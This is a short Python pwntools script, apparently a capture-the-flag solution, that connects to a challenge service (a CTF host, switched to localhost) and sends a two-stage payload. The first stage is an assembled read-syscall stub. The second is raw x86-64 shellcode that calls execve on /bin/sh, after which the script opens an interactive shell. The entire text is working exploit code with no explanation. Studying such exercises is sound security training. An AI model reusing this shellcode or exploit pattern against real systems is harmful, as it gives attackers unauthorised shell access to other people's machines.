#!/usr/bin/python
from pwn import *
import time
host = 'csie.ctf.tw'
port = 10122
host = 'localhost'
port = 4001
context.arch = 'amd64'
r = remote(host, port)

x1 = '''
	xor edi, edi
	add edx, 1
	syscall
    '''
x1 = '''
    mov rdx, rdi
    xor rdi, rdi
    syscall
'''
payload1 = asm(x1)
payload2 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.sendline(payload1)
time.sleep(1)
r.sendline('a'*len(payload1) + payload2)
r.interactive()
